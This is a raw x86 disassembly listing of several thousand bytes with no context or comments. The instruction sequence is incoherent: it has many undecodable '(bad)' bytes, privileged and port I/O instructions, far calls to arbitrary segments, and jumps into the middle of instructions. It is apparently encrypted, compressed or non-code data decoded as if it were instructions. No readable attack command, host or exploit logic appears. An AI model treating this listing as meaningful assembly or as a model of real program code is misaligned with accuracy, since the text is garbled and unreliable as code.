  421562:	push   ss
  421563:	xchg   edx,eax
  421564:	(bad)  
  421565:	sub    eax,0xd42efe0d
  42156a:	sub    eax,0x5adefb9c
  42156f:	jecxz  0x42156b
  421571:	or     ecx,DWORD PTR [ebp-0x1c12db09]
  421577:	popf   
  421578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421579:	jp     0x421576
  42157b:	in     eax,dx
  42157c:	(bad)  
  42157d:	loop   0x421597
  42157f:	sub    dh,BYTE PTR [edx+ebp*4-0x46]
  421583:	xor    eax,0x2fe9bbbd
  421588:	clc    
  421589:	into   
  42158a:	daa    
  42158b:	add    eax,0x8ace2e51
  421590:	xchg   esi,eax
  421591:	sbb    al,0x30
  421593:	and    al,0x6e
  421595:	sar    DWORD PTR [esi],0x26
  421598:	cs enter 0x4239,0xb7
  42159d:	inc    edx
  42159e:	mov    edx,0xad5b75c7
  4215a3:	call   0xec69:0xce490b5
  4215aa:	lods   eax,DWORD PTR ds:[esi]
  4215ab:	cli    
  4215ac:	std    
  4215ad:	jmp    0x421552
  4215af:	push   edi
  4215b0:	mov    ebx,0xf9608f15
  4215b5:	sub    al,0xe8
  4215b7:	push   cs
  4215b8:	mov    dh,0x80
  4215ba:	rol    BYTE PTR [edx+0x7254167b],0xee
  4215c1:	popa   
  4215c2:	(bad)  
  4215c3:	and    al,0xce
  4215c5:	adc    BYTE PTR [ebx+0x3bc4d172],dl
  4215cb:	xor    bh,al
  4215cd:	add    DWORD PTR [edi+0x7ba9b860],0xfffffffd
  4215d4:	test   eax,0x4211dc70
  4215d9:	add    BYTE PTR [edx-0x5c],ah
  4215dc:	or     al,0x8f
  4215de:	aad    0xae
  4215e0:	cdq    
  4215e1:	cs jo  0x421636
  4215e4:	push   edi
  4215e5:	test   al,0xcf
  4215e7:	mov    bl,0x18
  4215e9:	push   es
  4215ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215eb:	cmp    DWORD PTR gs:[edx-0x3f],0xb4c02353
  4215f3:	(bad)  
  4215f4:	pop    ecx
  4215f5:	dec    esi
  4215f6:	cdq    
  4215f7:	(bad)  
  4215f8:	and    bl,BYTE PTR [edi-0x12a73d2c]
  4215fe:	push   0x58
  421600:	gs cli 
  421602:	arpl   bp,bp
  421604:	cmp    DWORD PTR [ecx+0x7f47783a],edi
  42160a:	mov    dl,ah
  42160c:	shl    DWORD PTR [ebx+0x22],cl
  42160f:	jno    0x421645
  421611:	cli    
  421612:	mov    al,0x96
  421614:	cdq    
  421615:	js     0x421597
  421617:	test   al,0x8
  421619:	retf   0x63d7
  42161c:	or     DWORD PTR [edx+0x1fab27b],ecx
  421622:	int    0xde
  421624:	dec    ebp
  421625:	xor    BYTE PTR [edx],ah
  421627:	in     eax,0x87
  421629:	jno    0x42161e
  42162b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42162c:	fld    DWORD PTR [edi+0x11]
  42162f:	pop    esp
  421630:	adc    BYTE PTR [ebx-0x5],0x5b
  421634:	(bad)  
  421636:	enter  0xe58a,0xd6
  42163a:	pop    edi
  42163b:	inc    esp
  42163c:	mov    edx,0x9c91446
  421641:	mov    ecx,0xe81a9699
  421646:	ret    
  421647:	inc    ebx
  421648:	sbb    eax,0x1d3331f8
  42164d:	mov    edi,0x9cb36cf2
  421652:	aad    0x61
  421654:	sbb    edi,ebp
  421656:	sub    eax,0x9b780855
  42165b:	mov    bl,0xda
  42165d:	pop    es
  42165e:	jge    0x42166d
  421660:	lahf   
  421661:	fdiv   QWORD PTR [edi-0x59]
  421664:	dec    edi
  421665:	int    0x87
  421667:	jle    0x42165f
  421669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42166a:	test   DWORD PTR [ebx+0x20670c9b],0x211260e2
  421674:	sbb    al,0x8d
  421676:	pop    ebx
  421677:	daa    
  421678:	(bad)  
  421679:	pop    ss
  42167a:	pop    ebp
  42167b:	or     DWORD PTR [ebp+0x75f9b2d4],0x77
  421682:	or     DWORD PTR [ebp-0x3cb96689],edx
  421688:	stos   BYTE PTR es:[edi],al
  421689:	div    BYTE PTR [ebx-0x674644c3]
  42168f:	sbb    DWORD PTR [edi],ecx
  421691:	adc    al,0xb8
  421693:	sbb    eax,0xc6cd05bc
  421698:	mov    ds:0x19ef59e7,al
  42169d:	(bad)  
  42169e:	sbb    cl,BYTE PTR [ecx-0x29]
  4216a1:	aaa    
  4216a2:	ja     0x42165d
  4216a4:	call   0xb7487791
  4216a9:	ins    BYTE PTR es:[edi],dx
  4216aa:	outs   dx,BYTE PTR ds:[esi]
  4216ab:	imul   edx,edi,0x19
  4216ae:	test   al,0x8a
  4216b0:	mov    cl,0x3e
  4216b2:	pop    edx
  4216b3:	inc    ecx
  4216b4:	ja     0x421645
  4216b6:	cld    
  4216b7:	(bad)  
  4216b8:	and    DWORD PTR [ecx-0x43],ecx
  4216bb:	cdq    
  4216bc:	adc    DWORD PTR [edx+0x7ee7836a],0x51
  4216c3:	or     ecx,ecx
  4216c5:	xor    al,0xcb
  4216c7:	sbb    bh,BYTE PTR [eax+0x1f]
  4216ca:	and    eax,0x862a1839
  4216cf:	retf   
  4216d0:	xor    al,0x7
  4216d2:	push   es
  4216d3:	dec    esi
  4216d4:	push   0xda34e311
  4216d9:	sub    BYTE PTR [eax+0x631234ea],cl
  4216df:	add    BYTE PTR ds:0x2f198b57,0x28
  4216e6:	adc    eax,0xd7cf2dee
  4216eb:	ja     0x421753
  4216ed:	add    eax,0xc150d9a3
  4216f2:	nop
  4216f3:	test   bh,cl
  4216f5:	or     al,BYTE PTR [ebp+0x7493f5cc]
  4216fb:	rol    DWORD PTR [esp+ebp*2],0x63
  4216ff:	add    esi,DWORD PTR [ebp+0x7ce4ee59]
  421705:	nop
  421706:	sahf   
  421707:	add    BYTE PTR [eax+ebx*2+0x3dbc52c6],dh
  42170e:	frstor [ebp+0x31a6f433]
  421714:	sbb    eax,0x494a9bfc
  421719:	xor    BYTE PTR [ebp+0x454546e2],al
  42171f:	cmp    esp,DWORD PTR [ebp+0x5b]
  421722:	jmp    0x46981c8
  421727:	pushf  
  421728:	imul   edx,DWORD PTR [edi+ebx*8+0x4c005f41],0x5ee35cb7
  421733:	gs inc ebp
  421735:	and    DWORD PTR [edi],edx
  421737:	(bad)  
  421738:	call   0xa2bd:0x9bfc4513
  42173f:	(bad)  
  421741:	and    BYTE PTR [ecx-0x3b1dca65],0x77
  421748:	gs out 0xde,eax
  42174b:	mov    DWORD PTR [ebx+0x6c5b2e72],ebx
  421751:	mov    ah,0x8e
  421753:	(bad)  
  421756:	les    esp,FWORD PTR [ecx]
  421758:	dec    ebp
  421759:	ret    
  42175a:	dec    esi
  42175b:	xor    eax,0x94e79c7c
  421760:	jp     0x796b1d05
  421766:	fdiv   st,st(4)
  421768:	inc    ecx
  421769:	xchg   esi,eax
  42176a:	aaa    
  42176b:	mov    esp,0xf6894aeb
  421770:	cmp    al,BYTE PTR [ecx]
  421772:	outs   dx,BYTE PTR ds:[esi]
  421773:	lods   al,BYTE PTR ds:[esi]
  421774:	push   esp
  421775:	dec    ebx
  421776:	push   0x6
  421778:	addr16 test al,0x3f
  42177b:	ret    0x1c37
  42177e:	mov    es,WORD PTR [esi-0xe]
  421781:	mov    edx,0x575eb878
  421786:	xor    eax,0x4f992680
  42178b:	and    cl,BYTE PTR [ebx-0x1c]
  42178e:	pop    esi
  42178f:	das    
  421790:	and    al,0x86
  421792:	push   eax
  421793:	imul   esp,DWORD PTR [ebx],0x2fecbe69
  421799:	mov    es,WORD PTR [edx+0x1f]
  42179c:	sysenter 
  42179e:	popf   
  42179f:	fcmovnbe st,st(0)
  4217a1:	xchg   edx,eax
  4217a2:	sbb    BYTE PTR [ecx+edx*1],0x6b
  4217a6:	xor    al,0x60
  4217a8:	xchg   DWORD PTR [esi-0x1b108669],esp
  4217ae:	jno    0x42180e
  4217b0:	xor    al,0xd5
  4217b2:	fldz   
  4217b4:	xor    dh,BYTE PTR [eax+0x1f]
  4217b7:	(bad)
  4217ba:	neg    DWORD PTR [ebx+0x6e]
  4217bd:	xor    ebp,DWORD PTR [eax]
  4217bf:	inc    eax
  4217c0:	imul   ebp,ebx,0x67
  4217c3:	pop    esi
  4217c4:	repz or eax,0xd40c528e
  4217ca:	xchg   ebx,eax
  4217cb:	and    al,0xac
  4217cd:	or     ecx,DWORD PTR [ecx+0x1b06696a]
  4217d3:	xor    cl,BYTE PTR [esi-0x94040f2]
  4217d9:	push   es
  4217da:	ins    DWORD PTR es:[edi],dx
  4217db:	call   0xbca38fb1
  4217e0:	push   es
  4217e1:	fs push esp
  4217e3:	add    eax,0xa1aaf6f2
  4217e8:	mov    edi,0xd34b1579
  4217ed:	sub    BYTE PTR [ecx+ebp*4+0x57],bh
  4217f1:	dec    ebp
  4217f2:	div    BYTE PTR [eax]
  4217f4:	mov    esp,0x92b2f1ce
  4217f9:	aas    
  4217fa:	jb     0x421862
  4217fc:	mov    ah,BYTE PTR [ecx+0x44]
  4217ff:	inc    eax
  421800:	fldenv [edx]
  421802:	repnz sar BYTE PTR [ecx-0x42de0326],0x2b
  42180a:	aas    
  42180b:	cli    
  42180c:	ds adc edi,edi
  42180f:	ret    
  421810:	les    edi,FWORD PTR [edi+ebx*2]
  421813:	mov    ch,0x35
  421815:	and    eax,0x2803c8c4
  42181a:	mov    ah,dh
  42181c:	add    al,0x44
  42181e:	imul   eax,DWORD PTR [eax],0x4c3a665a
  421824:	daa    
  421825:	push   ebx
  421826:	pop    ss
  421827:	sub    DWORD PTR [edi-0x5b],0x197ca90c
  42182e:	jo     0x4217ec
  421830:	clc    
  421831:	adc    edx,DWORD PTR [ecx-0x7fe0c335]
  421837:	mov    edi,0xd5e0da3a
  42183c:	imul   edi,DWORD PTR [edi],0x73
  42183f:	ret    
  421840:	xor    esi,ecx
  421842:	xchg   ebx,eax
  421843:	fistp  DWORD PTR [eax+0x61]
  421846:	sti    
  421847:	fstp   QWORD PTR [edx+0x17]
  42184a:	gs sti 
  42184c:	test   BYTE PTR [esi-0x35],cl
  42184f:	pop    ds
  421850:	call   0x65eeeb85
  421855:	sbb    dl,BYTE PTR [eax+0x22e3982c]
  42185b:	jb     0x4217e8
  42185d:	mov    ds:0xb5b9d59f,al
  421862:	add    al,0xac
  421864:	mov    eax,0xe2ad33de
  421869:	scas   al,BYTE PTR es:[edi]
  42186a:	mov    cl,0x4a
  42186c:	pop    ebp
  42186d:	cld    
  42186e:	loop   0x421845
  421870:	xchg   DWORD PTR [ebp+0x13],ebx
  421873:	mov    eax,ds:0x494a4b0a
  421878:	cli    
  421879:	inc    eax
  42187a:	dec    edx
  42187b:	adc    eax,0x3b7a1781
  421880:	xor    cl,BYTE PTR [ebx+0x6f]
  421883:	add    ebp,ebx
  421885:	sub    al,0x9a
  421887:	xor    eax,esp
  421889:	jbe    0x4218bf
  42188b:	repnz outs dx,BYTE PTR ds:[esi]
  42188d:	jb     0xf746ae9a
  421893:	fisub  DWORD PTR [ecx+0x536eb3de]
  421899:	or     eax,0xd3db4d66
  42189e:	push   ds
  42189f:	cwde   
  4218a0:	mov    ch,bh
  4218a2:	aas    
  4218a3:	rcr    DWORD PTR gs:[ebx+0x17cacf4d],1
  4218aa:	(bad)  
  4218ab:	jo     0x421880
  4218ad:	in     eax,0xbb
  4218af:	dec    edx
  4218b0:	push   ss
  4218b1:	and    eax,0x61e2e66c
  4218b6:	outs   dx,DWORD PTR ds:[esi]
  4218b7:	test   BYTE PTR [ecx],cl
  4218b9:	pop    edi
  4218ba:	xchg   ecx,eax
  4218bc:	cmp    eax,0xfc029cd
  4218c1:	xchg   esp,eax
  4218c2:	pavgw  mm5,QWORD PTR [edi-0x4e]
  4218c6:	dec    eax
  4218c7:	pop    edi
  4218c8:	retf   0x7680
  4218cb:	mov    esp,0x58575ee4
  4218d0:	aad    0xcb
  4218d2:	sbb    DWORD PTR [ebx-0x3a9017c6],esi
  4218d8:	sbb    bl,BYTE PTR [edx-0x7b4dcaa0]
  4218de:	mov    ebx,0xaa9a3acc
  4218e3:	and    DWORD PTR [edx-0x7e],ebp
  4218e6:	jno    0x42186a
  4218e8:	push   es
  4218e9:	inc    edi
  4218ea:	test   al,0xeb
  4218ec:	sub    dh,BYTE PTR [edi-0x640ebbf9]
  4218f2:	push   esp
  4218f3:	mov    al,ds:0x657e1969
  4218f8:	repz dec esp
  4218fa:	out    dx,eax
  4218fb:	imul   edx,DWORD PTR gs:[eax-0x77],0x11db8a68
  421903:	cmp    al,cl
  421905:	call   0x260e42db
  42190a:	loopne 0x42188c
  42190c:	ds and cl,dl
  42190f:	ja     0x421934
  421911:	lods   al,BYTE PTR ds:[esi]
  421912:	ds and al,0x16
  421915:	shl    BYTE PTR [ebx+0x1dedbdee],1
  42191b:	mov    dh,0xc4
  42191d:	pop    edi
  42191e:	dec    esi
  42191f:	sahf   
  421920:	repz test BYTE PTR [esi],cl
  421923:	and    DWORD PTR [ebx],0xffffff88
  421926:	add    eax,0x4cd68aa3
  42192b:	outs   dx,DWORD PTR ds:[esi]
  42192c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42192d:	das    
  42192e:	dec    eax
  42192f:	jmp    0x65ba:0xced5d7ba
  421936:	jne    0x4218ff
  421938:	inc    ebp
  421939:	xchg   esi,eax
  42193a:	cmp    al,0xef
  42193c:	std    
  42193d:	and    BYTE PTR [esi+eax*2+0x368e845a],ah
  421944:	sti    
  421945:	and    DWORD PTR [esi],0x432a4864
  42194b:	mov    ds:0xb868cdd4,al
  421950:	adc    al,0xa6
  421952:	outs   dx,DWORD PTR ds:[esi]
  421953:	pop    esi
  421954:	shl    BYTE PTR [ecx],1
  421956:	adc    eax,0xb1e07fef
  42195b:	(bad)  
  42195c:	dec    edx
  42195d:	ja     0x4219ae
  42195f:	sti    
  421960:	jmp    0x4634:0xa9fda911
  421967:	adc    eax,DWORD PTR [eax+0x25941fb1]
  42196d:	jnp    0x421980
  42196f:	fisub  WORD PTR [eax+ebx*1-0x59c3d08a]
  421976:	pop    ss
  421977:	cwde   
  421978:	jge    0x421925
  42197a:	clc    
  42197b:	in     eax,0x54
  42197d:	jno    0x421952
  42197f:	das    
  421980:	or     esi,DWORD PTR [ebx]
  421982:	cmp    ah,ah
  421984:	pop    eax
  421985:	loope  0x42193c
  421987:	mov    al,0x34
  421989:	std    
  42198a:	repnz fidiv DWORD PTR [edi+eax*8-0x500b3d2c]
  421992:	cdq    
  421993:	cwde   
  421994:	repnz dec edi
  421996:	inc    edi
  421997:	xchg   BYTE PTR [ebx+ebp*8],bl
  42199a:	cmp    eax,0x15508e53
  42199f:	mov    dl,0x23
  4219a1:	and    DWORD PTR [ecx-0x75cf62d3],edx
  4219a7:	cli    
  4219a8:	imul   eax,DWORD PTR [eax],0xc480c180
  4219ae:	mov    eax,ds:0x3ca0d455
  4219b3:	retf   
  4219b4:	add    DWORD PTR [ebx+0x3f322dfa],esi
  4219ba:	pop    ebp
  4219bb:	aas    
  4219bc:	inc    edi
  4219bd:	ror    BYTE PTR [ecx],cl
  4219bf:	sbb    eax,0xf6189455
  4219c4:	and    ebp,DWORD PTR [eax+0x3b]
  4219c7:	outs   dx,DWORD PTR ds:[esi]
  4219c8:	xchg   esi,eax
  4219c9:	push   es
  4219ca:	xor    edi,eax
  4219cc:	add    ebp,DWORD PTR [ebp-0x34691b02]
  4219d2:	or     esp,DWORD PTR [edi]
  4219d4:	xor    dl,BYTE PTR [ebx-0x325e98ef]
  4219da:	repz add al,0xa5
  4219dd:	ret    
  4219de:	outs   dx,DWORD PTR ds:[esi]
  4219df:	jo     0x42198c
  4219e1:	mov    WORD PTR fs:[edx],gs
  4219e4:	pushf  
  4219e5:	and    DWORD PTR [edx+0x2e193b95],edx
  4219eb:	test   DWORD PTR [esi+ebp*2],0x6e063934
  4219f2:	mov    ebx,fs
  4219f4:	outs   dx,DWORD PTR ds:[esi]
  4219f5:	mul    BYTE PTR ds:0xb3aba34d
  4219fb:	(bad)  
  4219fc:	js     0x421982
  4219fe:	pop    esp
  4219ff:	(bad)  
  421a00:	ss sbb eax,0xb6612861
  421a06:	xchg   esi,eax
  421a07:	dec    edx
  421a08:	jmp    0x4219d0
  421a0a:	cmp    al,0xa4
  421a0c:	pushf  
  421a0d:	rcr    BYTE PTR [edi-0x44],0xd1
  421a11:	das    
  421a12:	push   esi
  421a13:	jno    0x4219b1
  421a15:	in     al,dx
  421a16:	repnz or al,0xd6
  421a19:	in     eax,dx
  421a1a:	or     al,0xd8
  421a1c:	mov    ah,0x6a
  421a1e:	mov    WORD PTR [edi],?
  421a20:	inc    ebp
  421a21:	xchg   DWORD PTR [ecx+ecx*1-0x626b6e1a],edi
  421a28:	adc    eax,0xcf5fd96a
  421a2d:	lock mov BYTE PTR [eax+0x1e3e3120],dl
  421a34:	(bad)  
  421a35:	adc    al,0x6a
  421a37:	test   DWORD PTR [edx+edx*2-0x626af9c7],esi
  421a3e:	in     eax,0x8f
  421a40:	and    al,0x31
  421a42:	jl     0x421ab6
  421a44:	pop    ss
  421a45:	xchg   BYTE PTR [esp+edi*4-0x39a1f391],ch
  421a4c:	mov    al,0x73
  421a4e:	sbb    DWORD PTR [ecx+edi*8-0x4292192e],0x18
  421a56:	pop    esi
  421a57:	pop    edx
  421a58:	mov    bl,0xae
  421a5a:	add    DWORD PTR [ecx-0x1862c2db],ebp
  421a60:	aam    0xd
  421a62:	setbe  BYTE PTR [edi+eiz*2+0x52]
  421a67:	mul    BYTE PTR [eax]
  421a69:	inc    edx
  421a6a:	pop    ds
  421a6b:	inc    esp
  421a6c:	jmp    0x421a7e
  421a6e:	fwait
  421a6f:	sub    eax,0x689739e
  421a74:	xor    BYTE PTR [ecx+0x2d],ah
  421a77:	pop    ebx
  421a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a79:	test   al,0x9e
  421a7b:	(bad)  
  421a7c:	xor    eax,0xb22c5853
  421a81:	mov    BYTE PTR [ecx-0x3d69fd70],0xb2
  421a88:	call   0x609f:0x121971f0
  421a8f:	inc    eax
  421a90:	aam    0x7f
  421a92:	into   
  421a93:	rcl    DWORD PTR [edx],0x7a
  421a96:	in     eax,dx
  421a97:	shl    BYTE PTR [ecx-0x21],0x77
  421a9b:	mov    dh,0x84
  421a9d:	std    
  421a9e:	push   0x527b8ff9
  421aa3:	add    BYTE PTR ds:0x797dc1b,al
  421aa9:	add    BYTE PTR [esi-0x10],ah
  421aac:	adc    cl,BYTE PTR [esi+0x7be938d7]
  421ab2:	outs   dx,DWORD PTR ds:[esi]
  421ab3:	push   ds
  421ab4:	fst    QWORD PTR fs:[ebp-0x6986fc4c]
  421abb:	cmp    DWORD PTR [eax+0x32],0xffffffe5
  421abf:	dec    ecx
  421ac0:	sbb    al,0x45
  421ac2:	retf   
  421ac3:	fdivr  st(3),st
  421ac5:	aad    0x51
  421ac7:	adc    DWORD PTR [edx+eiz*1+0x7c74139f],esp
  421ace:	jmp    0x776f:0x211ee97a
  421ad5:	(bad)  
  421ad6:	pop    ds
  421ad7:	mov    ecx,ebx
  421ad9:	lahf   
  421ada:	or     eax,0xa6d0e1ad
  421adf:	(bad)  
  421ae0:	sbb    eax,0xd8758db4
  421ae5:	pop    ebx
  421ae6:	mov    ebx,0xae239f07
  421aeb:	pop    esi
  421aec:	push   esi
  421aed:	sub    al,0x7a
  421aef:	pop    edx
  421af0:	ror    DWORD PTR [ebp+0x42896f0d],0xb1
  421af7:	push   ss
  421af8:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421afa:	inc    esi
  421afb:	repz pop ss
  421afd:	lock cmp ebx,DWORD PTR [esp+ebx*1-0x2475c7dc]
  421b05:	ror    DWORD PTR [ecx-0x3229096f],0x40
  421b0c:	xor    eax,0xc174a715
  421b11:	into   
  421b12:	ficom  DWORD PTR [eax+0x8cc1f00]
  421b18:	(bad)  
  421b1a:	stc    
  421b1b:	mov    ch,0x7a
  421b1d:	arpl   WORD PTR [eax-0x33fbe7],dx
  421b23:	pusha  
  421b24:	sbb    al,0xf6
  421b26:	dec    ebx
  421b27:	repnz lds edx,FWORD PTR [eax-0x144063d8]
  421b2e:	cmp    eax,0x4c5fe87d
  421b33:	pop    esi
  421b34:	or     al,0xc9
  421b36:	jp     0x421b01
  421b38:	aas    
  421b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b3a:	(bad)  
  421b3b:	pushf  
  421b3c:	sub    eax,0x63815596
  421b41:	jns    0x421b62
  421b43:	in     eax,0x6d
  421b45:	rcl    BYTE PTR ds:0x4ebb1ed3,cl
  421b4b:	and    BYTE PTR [edx],al
  421b4d:	cmp    eax,0xf06ddf8
  421b52:	test   eax,0xf0820248
  421b57:	and    eax,0x1c30132f
  421b5c:	fistp  QWORD PTR [esi]
  421b5e:	dec    esp
  421b5f:	aam    0xb7
  421b61:	and    edi,ebp
  421b63:	cmp    dl,BYTE PTR [eax-0x77]
  421b66:	(bad)  
  421b67:	cmp    al,0x10
  421b69:	pop    edx
  421b6a:	jmp    0xf9ff:0xa7f695e5
  421b71:	dec    ebx
  421b72:	pop    eax
  421b73:	in     eax,dx
  421b74:	(bad)  
  421b75:	mov    eax,0x2e10a1e8
  421b7a:	pop    esi
  421b7b:	mov    esp,0x20a74361
  421b80:	sub    DWORD PTR [edi-0x34],ebp
  421b83:	aas    
  421b84:	daa    
  421b85:	loope  0x421ba0
  421b87:	lods   eax,DWORD PTR ds:[esi]
  421b88:	inc    ecx
  421b89:	xor    eax,0x7fd90ebe
  421b8e:	mov    ds:0x411480b3,eax
  421b93:	retf   0x5602
  421b96:	dec    edx
  421b97:	push   edx
  421b98:	(bad)  
  421b99:	or     eax,0x4ef1ddb0
  421b9e:	xlat   BYTE PTR ds:[ebx]
  421b9f:	stos   BYTE PTR es:[edi],al
  421ba0:	int3   
  421ba1:	rol    esi,1
  421ba3:	adc    BYTE PTR [edi+ecx*4-0x5f],0x71
  421ba8:	pop    ss
  421ba9:	add    al,0xad
  421bab:	dec    edx
  421bac:	push   ds
  421bad:	jecxz  0x421bff
  421baf:	out    dx,al
  421bb0:	pop    esp
  421bb1:	clc    
  421bb2:	cmp    DWORD PTR [edx+0x3289cbee],esi
  421bb8:	iret   
  421bb9:	cmp    DWORD PTR [ebx-0x674b79f8],eax
  421bbf:	mov    bl,0x6b
  421bc1:	retf   0x2969
  421bc4:	dec    edi
  421bc5:	cmc    
  421bc6:	mov    al,0x20
  421bc8:	repz sbb BYTE PTR gs:[esp+ebx*4],0xc2
  421bce:	in     al,0xcf
  421bd0:	mov    ds:0x9248e62f,al
  421bd5:	add    ebp,DWORD PTR [eax]
  421bd7:	jl     0x421bf1
  421bd9:	push   ebx
  421bda:	mov    dh,BYTE PTR [edx-0x2d]
  421bdd:	add    ecx,DWORD PTR ds:0xc6768e79
  421be3:	loope  0x421b67
  421be5:	dec    esi
  421be6:	mov    eax,0x2c90d111
  421beb:	fs mov ecx,0xbe0e1a6b
  421bf1:	mov    al,0x18
  421bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bf4:	mov    WORD PTR [edi+0x73],es
  421bf7:	dec    eax
  421bf8:	ds fs adc eax,0x552bc530
  421bff:	sub    ch,BYTE PTR [eax-0x5e]
  421c02:	and    cl,BYTE PTR [eax+0x22d06ea2]
  421c08:	and    DWORD PTR [esp+ecx*2],0x9a91035b
  421c0f:	sbb    ecx,DWORD PTR [ecx+0x2b]
  421c12:	popf   
  421c13:	cmp    al,ah
  421c15:	adc    al,0x97
  421c17:	stos   BYTE PTR es:[edi],al
  421c18:	mov    esp,0xfbff7f75
  421c1d:	mov    eax,DWORD PTR [edi-0x576ca3b5]
  421c23:	xchg   DWORD PTR [esi-0x7b0458f],ebx
  421c29:	out    dx,al
  421c2a:	pusha  
  421c2b:	leave  
  421c2c:	add    al,0x70
  421c2e:	icebp  
  421c2f:	xchg   BYTE PTR [esi+0x3562c59b],dl
  421c35:	xchg   ebp,eax
  421c36:	jne    0x421bce
  421c38:	imul   ebx,DWORD PTR [ebx+edi*4+0x8],0x31aa0510
  421c40:	mov    cl,0xe5
  421c42:	push   0xaeb6d59e
  421c47:	jge    0x421c70
  421c49:	jg     0x421bed
  421c4b:	push   esi
  421c4c:	fmul   DWORD PTR [edx-0x40]
  421c4f:	dec    edi
  421c50:	jg     0x421bfc
  421c52:	fimul  DWORD PTR [esi+0x3207bca5]
  421c58:	xchg   edi,eax
  421c59:	rcl    BYTE PTR [edx-0x5],cl
  421c5c:	sub    edx,ebx
  421c5e:	push   eax
  421c5f:	xor    ah,BYTE PTR [ebx]
  421c61:	repnz xchg edi,eax
  421c63:	out    dx,eax
  421c64:	rcl    DWORD PTR [eax+ecx*8+0x665de119],1
  421c6b:	inc    esp
  421c6c:	mov    edx,0x4ba261c7
  421c71:	or     al,0xea
  421c73:	out    0x9a,eax
  421c75:	xor    ebp,DWORD PTR [esi-0x70]
  421c78:	fstp   QWORD PTR [edi+0x5d01af17]
  421c7e:	test   eax,0xb2b88bc5
  421c83:	dec    ebp
  421c84:	cwde   
  421c85:	jle    0x421c91
  421c87:	fld    QWORD PTR [ecx-0xe2a2e9]
  421c8d:	jns    0x421cfb
  421c8f:	push   edx
  421c90:	mov    edx,DWORD PTR [edi+0x44902efe]
  421c96:	mov    esi,0x1288a81d
  421c9b:	mov    edi,DWORD PTR [esi+0x13]
  421c9e:	fadd   DWORD PTR [edx+edi*8]
  421ca1:	add    al,al
  421ca3:	ins    BYTE PTR es:[edi],dx
  421ca4:	ja     0x421cda
  421ca6:	mov    DWORD PTR [edx*8-0x186730d8],esp
  421cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cae:	cld    
  421caf:	loopne 0x421c48
  421cb1:	stos   BYTE PTR es:[edi],al
  421cb2:	sub    ecx,DWORD PTR [esi-0x48]
  421cb5:	inc    ecx
  421cb6:	adc    ebp,DWORD PTR [edx]
  421cb8:	cwde   
  421cb9:	cmp    bh,dl
  421cbb:	call   0x734165e2
  421cc0:	std    
  421cc1:	and    ah,BYTE PTR [ebx+0xdf97a32]
  421cc7:	in     eax,dx
  421cc8:	mov    ebx,0x90b27665
  421ccd:	mov    dh,0x98
  421ccf:	jecxz  0x421d2f
  421cd1:	call   0x675e3fb1
  421cd6:	mov    esi,0xf858739c
  421cdb:	retf   
  421cdc:	push   0x2a2efed2
  421ce1:	add    eax,0x589b2cea
  421ce6:	adc    DWORD PTR [ebx+0x29],edi
  421ce9:	or     esp,0xffffffcf
  421cec:	cdq    
  421ced:	loop   0x421d38
  421cef:	std    
  421cf0:	jb     0x421ca0
  421cf2:	pop    ebx
  421cf3:	loopne 0x421c9a
  421cf5:	add    ebx,DWORD PTR [edx-0x55]
  421cf8:	jnp    0x421d11
  421cfa:	jmp    0x421cb4
  421cfc:	xchg   DWORD PTR [eax-0x2f],eax
  421cff:	imul   ecx,ecx
  421d02:	fist   WORD PTR [ecx]
  421d04:	mov    esp,0x3dbb4f1a
  421d09:	dec    eax
  421d0a:	pop    ebx
  421d0b:	jge    0x421d78
  421d0d:	popf   
  421d0e:	lea    eax,[edx]
  421d10:	pop    edi
  421d11:	fldcw  WORD PTR [esi-0x2b3a0ed6]
  421d17:	cmc    
  421d18:	fidiv  WORD PTR [esi]
  421d1a:	inc    edi
  421d1b:	enter  0x183,0xb4
  421d1f:	sub    DWORD PTR [edx-0x5cd95c80],esp
  421d25:	xchg   DWORD PTR [edi-0x23],edi
  421d28:	xchg   BYTE PTR [esi],ah
  421d2a:	push   edx
  421d2b:	js     0x421da9
  421d2d:	adc    DWORD PTR [esi],0x6b
  421d30:	loope  0x421d59
  421d32:	icebp  
  421d33:	and    al,dh
  421d35:	cli    
  421d36:	shl    al,cl
  421d38:	daa    
  421d39:	xchg   ebp,eax
  421d3a:	adc    eax,0xfb8156f8
  421d3f:	jno    0x421d92
  421d41:	xchg   ecx,eax
  421d42:	xchg   ax,ax
  421d44:	sqrtps xmm1,XMMWORD PTR [ebx-0x1e]
  421d48:	dec    ebx
  421d49:	or     eax,0x784a7a82
  421d4e:	lahf   
  421d4f:	(bad)  [eax]
  421d51:	xor    bh,bh
  421d53:	fisubr DWORD PTR ss:[edx-0x5954042a]
  421d5a:	lods   al,BYTE PTR ds:[esi]
  421d5b:	dec    ecx
  421d5c:	dec    ebx
  421d5d:	loop   0x421d82
  421d5f:	mov    edi,0xc69c3b45
  421d64:	mov    dl,0xd1
  421d66:	std    
  421d67:	dec    esp
  421d69:	(bad)  
  421d6a:	shl    DWORD PTR [ecx-0x3d316287],1
  421d70:	jmp    0x421dd4
  421d72:	iret   
  421d73:	xchg   edi,eax
  421d74:	enter  0xb822,0x8a
  421d78:	and    eax,0xd6c40878
  421d7d:	adc    DWORD PTR [ecx-0x1cd432d9],0x19797300
  421d87:	pop    esp
  421d88:	and    ch,dl
  421d8a:	ja     0x421deb
  421d8c:	daa    
  421d8d:	push   es
  421d8e:	adc    eax,0xe91e3fa6
  421d93:	cli    
  421d94:	idiv   DWORD PTR [eax-0x53d99cb4]
  421d9a:	push   0x73f17b8d
  421d9f:	inc    edi
  421da0:	sbb    BYTE PTR [edi-0x67db61f8],bh
  421da6:	mov    eax,ds:0xa5581ba6
  421dab:	xor    BYTE PTR [esi+0x75],cl
  421dae:	adc    al,0x66
  421db0:	or     al,0x4e
  421db2:	in     eax,dx
  421db3:	test   eax,0x754abbf9
  421db8:	xchg   esp,eax
  421db9:	loop   0x421d69
  421dbb:	mov    ah,0xb6
  421dbd:	jg     0x421e0d
  421dbf:	jnp    0x421e2e
  421dc1:	or     al,0xfa
  421dc3:	xor    al,0x54
